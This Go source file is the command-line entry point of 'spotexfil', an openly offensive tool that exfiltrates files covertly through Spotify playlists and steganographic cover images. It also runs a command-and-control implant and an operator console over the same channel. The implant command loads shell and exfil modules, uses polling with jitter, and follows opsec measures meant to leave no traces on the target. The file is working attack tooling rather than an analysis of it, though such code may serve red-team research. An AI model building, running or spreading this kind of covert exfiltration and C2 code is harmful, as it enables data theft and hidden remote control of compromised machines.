//go:build !implantonly

// Package main provides the spotexfil CLI.
package main

import (
	"context"
	"errors"
	"fmt"
	"html"
	"io"
	"os"
	"strings"
	"time"

	"github.com/sourcefrenchy/spotexfil/internal/c2"
	"github.com/sourcefrenchy/spotexfil/internal/crypto"
	"github.com/sourcefrenchy/spotexfil/internal/encoding"
	"github.com/sourcefrenchy/spotexfil/internal/shared"
	"github.com/sourcefrenchy/spotexfil/internal/spotify"
	"github.com/sourcefrenchy/spotexfil/internal/stego"
	"github.com/spf13/cobra"
)

// deliverSessionKey delegates to c2.DeliverSessionKey (shared with the
// minimal implant binary). Kept as a thin wrapper for the CLI tests.
func deliverSessionKey(key, keyFile string, quiet bool, w io.Writer) error {
	return c2.DeliverSessionKey(key, keyFile, quiet, w)
}

var version = "1.0.0"

func main() {
	rootCmd := &cobra.Command{
		Use:   "spotexfil",
		Short: "SpotExfil: covert data exfiltration via Spotify",
	}

	rootCmd.AddCommand(
		sendCmd(),
		receiveCmd(),
		cleanCmd(),
		c2ImplantCmd(),
		c2OperatorCmd(),
		versionCmd(),
	)

	if err := rootCmd.Execute(); err != nil {
		os.Exit(1)
	}
}

func sendCmd() *cobra.Command {
	var file, key string
	var noCompress, legacyNames, cover bool

	cmd := &cobra.Command{
		Use:   "send",
		Short: "Exfiltrate a file",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, !legacyNames)
			if err != nil {
				return err
			}

			ctx := context.Background()

			// Clear existing data
			if err := client.DeleteChunks(ctx); err != nil {
				return err
			}

			// Encode payload
			payload, err := encoding.EncodePayload(file, key, !noCompress)
			if err != nil {
				return err
			}

			if cover {
				return sendViaCover(ctx, client, payload)
			}

			// Write chunks
			return client.WriteChunks(ctx, payload)
		},
	}

	cmd.Flags().StringVarP(&file, "file", "f", "", "Path to the file to exfiltrate")
	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase for AES-256-GCM")
	cmd.Flags().BoolVar(&noCompress, "no-compress", false, "Disable gzip compression")
	cmd.Flags().BoolVar(&legacyNames, "legacy-names", false, "Use N-payloadChunk naming")
	cmd.Flags().BoolVar(&cover, "cover", false, "Hide the payload in a playlist cover image (one playlist, ~200KB max)")
	cmd.MarkFlagRequired("file")

	return cmd
}

// sendViaCover embeds the encoded payload in a generated playlist cover
// image and uploads it as a single playlist's cover.
func sendViaCover(ctx context.Context, client *spotify.Client, payload string) error {
	stegoJPEG, err := embedCoverPayload(payload)
	if err != nil {
		return err
	}

	markerSep := shared.Proto.Transport.MarkerSep
	id, err := client.CreateSessionPlaylist(ctx, spotify.GenerateCoverName(),
		markerSep+`{"cover":1}`)
	if err != nil {
		return fmt.Errorf("create playlist: %w", err)
	}
	if err := client.SetPlaylistCover(ctx, id, stegoJPEG); err != nil {
		return fmt.Errorf("set cover: %w", err)
	}
	fmt.Printf("[*] Data sent in one playlist cover (%d bytes payload, %d bytes image)\n",
		len(payload), len(stegoJPEG))
	return nil
}

// embedCoverPayload embeds an encoded payload into a generated cover
// image, with a clear error when it exceeds the cover capacity.
func embedCoverPayload(payload string) ([]byte, error) {
	jpeg, err := stego.GenerateCover(time.Now().UnixNano())
	if err != nil {
		return nil, fmt.Errorf("generate cover: %w", err)
	}
	stegoJPEG, err := stego.Embed(jpeg, []byte(payload))
	if err != nil {
		if errors.Is(err, stego.ErrTooLarge) {
			return nil, fmt.Errorf("payload too large for cover channel: %d bytes encoded "+
				"(cover capacity is ~%d KB — use the classic description channel)",
				len(payload), (stego.MaxCoverSize-len(jpeg)-16)/1024)
		}
		return nil, fmt.Errorf("embed: %w", err)
	}
	return stegoJPEG, nil
}

func receiveCmd() *cobra.Command {
	var key, output string
	var cover bool

	cmd := &cobra.Command{
		Use:   "receive",
		Short: "Retrieve exfiltrated data",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			ctx := context.Background()

			var payload string
			if cover {
				payload, err = receiveViaCover(ctx, client)
			} else {
				payload, err = client.ReadChunks(ctx)
			}
			if err != nil {
				return err
			}

			// Decode payload
			decoded, err := encoding.DecodePayload(payload, key)
			if err != nil {
				return err
			}

			if len(decoded) == 0 {
				return fmt.Errorf("no data decoded")
			}

			if output != "" {
				return os.WriteFile(output, decoded, 0644)
			}

			// Try text output, fall back to binary file
			fmt.Print(string(decoded))
			return nil
		},
	}

	cmd.Flags().StringVarP(&key, "key", "k", "", "Decryption passphrase")
	cmd.Flags().StringVarP(&output, "output", "o", "", "Output file path")
	cmd.Flags().BoolVar(&cover, "cover", false, "Retrieve the payload from a playlist cover image")

	return cmd
}

// receiveViaCover finds the playlist carrying a stego cover, downloads
// the image, and extracts the payload. A clean ErrNoPayload means
// Spotify re-encoded the image and the cover channel is unavailable.
func receiveViaCover(ctx context.Context, client *spotify.Client) (string, error) {
	markerSep := shared.Proto.Transport.MarkerSep
	playlists, err := client.GetAllPlaylists(ctx)
	if err != nil {
		return "", err
	}

	for _, p := range playlists {
		desc := html.UnescapeString(p.Description)
		if !strings.Contains(desc, markerSep) || !strings.Contains(desc, "cover") {
			continue
		}
		img, err := client.GetPlaylistCover(ctx, string(p.ID))
		if err != nil {
			return "", fmt.Errorf("download cover: %w", err)
		}
		payload, err := stego.Extract(img)
		if err != nil {
			if errors.Is(err, stego.ErrNoPayload) {
				return "", fmt.Errorf("cover channel unavailable: Spotify re-encoded "+
					"the image and stripped the payload (playlist %q). "+
					"Use the classic description channel", p.Name)
			}
			return "", fmt.Errorf("extract: %w", err)
		}
		fmt.Printf("[*] Extracted %d bytes from cover of %q\n", len(payload), p.Name)
		return string(payload), nil
	}
	return "", fmt.Errorf("no cover payload playlist found (send with --cover first)")
}

func cleanCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "clean",
		Short: "Remove all payload playlists",
		RunE: func(cmd *cobra.Command, args []string) error {
			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClient(cfg, true)
			if err != nil {
				return err
			}

			return client.DeleteChunks(context.Background())
		},
	}
}

func c2ImplantCmd() *cobra.Command {
	var interval, jitter int
	var pluginDir, tokenFile, modules, keyFile string
	var quiet, live bool

	cmd := &cobra.Command{
		Use:   "c2-implant",
		Short: "Run C2 implant",
		RunE: func(cmd *cobra.Command, args []string) error {
			// Auto-generate a random passphrase
			key, err := crypto.GeneratePassphrase()
			if err != nil {
				return fmt.Errorf("failed to generate key: %w", err)
			}
			if err := deliverSessionKey(key, keyFile, quiet, os.Stdout); err != nil {
				return err
			}

			// Load plugins if directory specified
			if pluginDir != "" {
				if err := c2.LoadPlugins(pluginDir); err != nil {
					fmt.Printf("[!] Plugin loading error: %v\n", err)
				}
			}

			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			// Implant opsec: never run interactive OAuth on the target,
			// never drop a token cache file on disk. The token must be
			// pre-staged (SPOTIFY_TOKEN_JSON, --token-file, or .cache).
			client, err := spotify.NewClientWithOptions(cfg, spotify.ClientOptions{
				UseCoverNames: true,
				AllowOAuth:    false,
				PersistToken:  false,
				TokenFile:     tokenFile,
			})
			if err != nil {
				return err
			}

			var allowed []string
			if modules != "" {
				for _, m := range strings.Split(modules, ",") {
					if m = strings.TrimSpace(m); m != "" {
						allowed = append(allowed, m)
					}
				}
			}

			implant := c2.NewImplantWithOptions(client, key, c2.ImplantOptions{
				Interval:       interval,
				Jitter:         jitter,
				Quiet:          quiet,
				AllowedModules: allowed,
				Live:           live,
			})
			implant.Run()
			return nil
		},
	}

	cmd.Flags().IntVar(&interval, "interval", shared.Proto.C2.DefaultInterval, "Polling interval (seconds)")
	cmd.Flags().IntVar(&jitter, "jitter", shared.Proto.C2.DefaultJitter, "Jitter range (seconds)")
	cmd.Flags().StringVar(&pluginDir, "plugin-dir", "", "Directory containing .so plugin modules")
	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")
	cmd.Flags().BoolVarP(&quiet, "quiet", "q", false, "Suppress non-error output (opsec)")
	cmd.Flags().StringVar(&keyFile, "key-file", "", "Write the generated session key to this path (0600) instead of stdout — required with --quiet")
	cmd.Flags().StringVar(&modules, "modules", "", "Comma-separated module allowlist (e.g. shell,exfil,sysinfo,push) — empty = all")
	cmd.Flags().BoolVar(&live, "live", false, "Live-session mode: edit-in-place session playlists (fewer API calls, lower latency)")

	return cmd
}

func c2OperatorCmd() *cobra.Command {
	var key, keyFile string
	var pollInterval int
	var persistSession bool
	var tokenFile string
	var live bool

	cmd := &cobra.Command{
		Use:   "c2-operator",
		Short: "Run C2 operator console",
		RunE: func(cmd *cobra.Command, args []string) error {
			// Resolve key: --key flag > --key-file > SPOTEXFIL_KEY env
			if key == "" && keyFile != "" {
				data, err := os.ReadFile(keyFile)
				if err != nil {
					return fmt.Errorf("read key file: %w", err)
				}
				key = strings.TrimSpace(string(data))
			}
			if key == "" {
				key = os.Getenv("SPOTEXFIL_KEY")
			}
			if key == "" {
				// Prompt interactively
				fmt.Print("[?] Enter session key: ")
				var input string
				fmt.Scanln(&input)
				key = strings.TrimSpace(input)
				if key == "" {
					return fmt.Errorf("no key provided")
				}
			}

			cfg, err := spotify.LoadConfig()
			if err != nil {
				return err
			}

			client, err := spotify.NewClientWithOptions(cfg, spotify.ClientOptions{
				UseCoverNames: true,
				AllowOAuth:    true,
				PersistToken:  true,
				TokenFile:     tokenFile,
			})
			if err != nil {
				return err
			}

			operator := c2.NewOperator(client, key, pollInterval, persistSession)
			operator.SetLive(live)
			operator.Interactive()
			return nil
		},
	}

	cmd.Flags().StringVarP(&key, "key", "k", "", "Encryption passphrase")
	cmd.Flags().StringVar(&keyFile, "key-file", "", "Path to file containing encryption passphrase")
	cmd.Flags().IntVar(&pollInterval, "poll-interval", 30, "Background poll interval in seconds (default 30)")
	cmd.Flags().BoolVar(&persistSession, "persist-session", false,
		"Persist session keys (encrypted) across restarts for result recovery (weakens forward secrecy)")
	cmd.Flags().BoolVar(&live, "live", false, "Live-session mode: edit-in-place session playlists (fewer API calls, lower latency)")
	cmd.Flags().StringVar(&tokenFile, "token-file", "", "Path to pre-staged Spotify token JSON (or use SPOTIFY_TOKEN_JSON)")

	return cmd
}

func versionCmd() *cobra.Command {
	return &cobra.Command{
		Use:   "version",
		Short: "Print version information",
		Run: func(cmd *cobra.Command, args []string) {
			fmt.Printf("spotexfil %s (Go)\n", version)
			fmt.Printf("Protocol version: %d\n", shared.Proto.Version)
		},
	}
}
